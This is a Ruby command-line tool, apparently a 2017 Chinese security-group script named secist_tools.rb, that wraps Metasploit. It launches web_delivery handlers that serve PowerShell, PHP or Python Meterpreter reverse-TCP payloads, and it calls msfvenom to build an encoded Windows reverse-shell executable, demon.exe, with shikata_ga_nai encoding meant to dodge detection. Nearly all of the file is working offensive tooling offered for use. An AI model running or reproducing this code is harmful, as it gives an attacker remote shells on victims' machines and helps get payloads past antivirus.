#!/usr/bin/env ruby
# -*- coding: UTF-8 -*-
require 'optparse'
require 'colorize'
require 'artii'
class Msf
   def clear
      system "clear"
      system "service postgresql start"
   end
end
msf = Msf.new
msf.clear
#system clear
a = Artii::Base.new :font => 'basic'
puts a.asciify('      secist').light_red


puts  "          -- -- +=[(c) 2017 | www.ggsec.cn | www.secist.com | Demon"
puts " "
puts  "         /==========================########========================\\"
puts  "         |                            # v1.0                        |"
puts  "         |                          版本框架整改1.0                 |"
puts "         |———————————#—————————————————#——————————————————#—————————|"
puts "         |                                           Demon 2017     |"
puts "         \\==========================================================/"
puts "    "

options = {}
optparse = OptionParser.new do |opts|
  # 命令行参数解析器，他们通常提供一种方式来显示帮助消息，当没有提供参数或参数错误。
puts ""
puts ""
  opts.banner = " 欢迎使用 secist_tools.rb [参数信息]"
  opts.separator ""
   options[:lhost] = "0.0.0.0"
   options[:lport] = "4444"
   options[:payload] = "windows/meterpreter/reverse_tcp"
  options[:target] = "powershell"


#定义了默认值
  #opts.on('-m', '--msf', 'metasploit ') do
    # 这个部分就是使用这个Option后执行的代码
    #msf.clear
    #system "msfconsole"
  #end
  $ip = options[:lhost]
  $port = options[:lport]
  $payload = options[:payload]
  $target = options[:target]

   # Option 作为 flag，带argument，用于将argument作为数值解析，比如"name"信息
   #下面的“value”就是用户使用时输入的argument


   # Option 作为 flag，带一组用逗号分割的arguments，用于将arguments作为数组解析
   opts.on('-m', '--payload VALUE', "payload to use|default = windows/meterpreter/reverse_tcp") do |m|
     options[:payload] = m
   end
# 设置payload参数
opts.on('-i', '--lhost VALUE', "ip_addr|default = 0.0.0.0") do |i|
    options[:lhost] = i
  end
# 设置ip参数
   opts.on('-p', '--lport VALUE', "port_number|default = 4444") do |p|
      options[:lport] = p
   end
# 设置端口参数
   opts.on( '--powershell', "msf_web_delivery: powershell ") do
        $ip = options[:lhost]
        $port = options[:lport]
          system("service postgresql start")
          system(" msfconsole -x 'use exploit/multi/script/web_delivery;\n set PAYLOAD windows/meterpreter/reverse_tcp;\n set TARGET 2;\n set LHOST #{$ip};\n set LPORT #{$port};\n set URIPATH /;\n run'")
end
  opts.on( '--php', "msf_web_delivery:  php") do
    $ip = options[:lhost]
    $port = options[:lport]
     system("service postgresql start")
     system(" msfconsole -x 'use exploit/multi/script/web_delivery;\n set PAYLOAD php/meterpreter/reverse_tcp;\n set TARGET 1;\n set LHOST #{$ip};\n set LPORT #{$port};\n set URIPATH /;\n run'")
end
    opts.on( '--python', "msf_web_delivery: python ") do
      $ip = options[:lhost]
      $port = options[:lport]
     system("service postgresql start")
     system(" msfconsole -x 'use exploit/multi/script/web_delivery;\n set LHOST #{$ip};\n set LPORT #{$port};\n set URIPATH /;\n run'")

end
   opts.on('-l','--msfvenom VALUE', "msfvenom output : exe ") do
       system(" msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\\x00’ LHOST=#{$ip}  LPORT=#{$port}  -f exe > demon.exe")
       puts "\n[*] Would you like to start a listener? (Y/n)".yellow
       msfconsole = gets.chomp
       if msfconsole == 'Y' || msfconsole == 'yes'|| msfconsole == 'y'
         puts "1"
         end
   end
     opts.separator ""
end
if ARGV.empty?
       puts optparse
       exit
else
       optparse.parse!
end
  puts options.inspect

# $ip = options[:lhost]
# $port = options[:lport]
# $payload = options[:payload]
# $target = options[:target]
